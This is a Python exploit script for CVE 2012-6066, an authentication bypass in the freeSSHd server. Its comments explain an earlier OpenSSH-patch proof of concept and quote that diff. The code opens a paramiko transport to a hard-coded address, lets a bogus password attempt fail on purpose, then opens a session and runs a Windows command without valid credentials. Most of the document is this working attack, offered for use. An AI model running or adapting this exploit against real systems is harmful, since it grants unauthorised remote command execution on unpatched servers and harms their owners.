import socket
import paramiko
import time

# this is a writeup exploit of CVE 2012-6066
# basically the  user needs to be on freeSSHd even since that authentication failed.
# discovery and original PoC provided By Aris,kingCope (2012)
# mainly what KingCope did in his PoC is change the source file of ssh.c and sshconnect2.c in the OpenSSH source code 
# the changes are
#$ diff openssh-5.8p2/ssh.c openssh-5.8p2_2/ssh.c
#209c209
#< static int ssh_session2(void);
#---
#> int ssh_session2(void);
#1374c1374
#< static int
#---
#> int

#$ diff openssh-5.8p2/sshconnect2.c openssh-5.8p2_2/sshconnect2.c
#873a874,876
#>     ssh_session2();
#>       exit(0);
#>
#1452a1456,1458
#>     ssh_session2();
#>       exit(0);
# the changes in the first file "ssh.c" changes the declaration type of the fuction "ssh_session2" from static int to int to enable it from getting called again within the same connection
# the changes in the second file "sshconnect2.c" calls the function "ssh_session2()" from "ssh.c" and exits right after the userauth_passwd() and userauth_pubkey() functions before any checks are made.
# after further analysis of the vulnerability My guess was that if i was able to interact with the ssh session ona lower level "Transport and channel level"
# i will be able to gain access and execute commands even if authentication fails same as the changes that was made by kingcope in the OpenSSH source file which exits immediatley after authentication functions are called.

# the prequisited of this script is to have paramiko module available also the user used in the exploit needs to be already in freeSSHD no password is needed

# create Socket for transport 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('172.16.49.152',22))

# create transport layer over socket 
t = paramiko.transport.Transport(s)

# start client over trasnport session

t.start_client()

# try fake auth and pass exceptino to failure ( if u want to make sure that the aith fails with provided username and password remove the try,except, & pass lines) and fix ident of the auth_password lines
try:
	t.auth_password('s','blablablabla')
except paramiko.SSHException:
	pass
# request channel with "session"
c = t.open_session()

#Execute iexplore.exe 

c.exec_command('cmd /c "c:\program files\internet Explorer\iexplore.exe"')
#time.sleep(10)
c.close()
t.close()
s.close()
